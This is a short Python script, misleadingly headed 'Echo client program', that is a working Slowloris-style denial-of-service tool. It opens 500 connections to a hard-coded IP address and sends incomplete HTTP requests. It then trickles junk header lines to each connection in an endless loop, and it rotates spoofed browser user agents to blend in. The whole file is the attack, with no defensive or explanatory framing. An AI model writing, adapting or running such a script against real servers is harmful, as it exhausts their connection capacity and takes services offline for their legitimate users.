# Echo client program
import random
import socket
import time

HOST = '165.227.137.80'    # The remote host
PORT = 80
NR_CONNECTIONS = 500


user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]

request_dict = [
    "X-a: G\r\n",
    "H-a: G\r\n",
    "o-a: G\r\n",
    "s-a: G\r\n",
    "t-a: G\r\n",
    "a-a: G\r\n",
    "f-a: G\r\n",
]

sync_req = "" \
           "GET / HTTP/1.1\r\n" \
           "Host: {}\r\n" \
           "Content-Encoding: gzip\r\n" \
           "Content-Type: text/html; charset=utf-8\r\n" \
           "Keep-Alive: timeout=5, max=1000\r\n".format(HOST)

sync_req1 = "GET / HTTP/1.1\r\nHost: 165.227.137.80\r\nKeep-Alive: timeout=5, max=1000\r\nUser-Agent: {0}\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9,ru;q=0.8\r\n".format(random.choice(user_agents))


connection_pull = []


def create_connection():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((HOST, PORT))
    print(sync_req1)
    try:
        s.send(sync_req1.encode("utf-8"))
    except socket.error:
        print("No connection.")
        connection_pull.remove(s)
    return s


def send_partial_request(sock, data):
    sock.send(data.encode('utf-8'))


def attack(s, partial_req):
    try:
        print("Sending part: {}", partial_req)
        send_partial_request(s, partial_req)
    except socket.error:
        print("Remove socket. Connection closed!")
        connection_pull.remove(s)


for i in range(0, NR_CONNECTIONS):
    sock = create_connection()
    connection_pull.append(sock)


while True:
    print(NR_CONNECTIONS - len(connection_pull))
    for _ in range(0, (NR_CONNECTIONS - len(connection_pull))):
        try:
            print("Create new connection!!!")
            sock = create_connection()
            if sock:
                connection_pull.append(sock)
        except socket.error:
            break

    for connection_sock in connection_pull:
        attack(connection_sock, random.choice(request_dict))

    print("Circle done!")

    time.sleep(0.5)

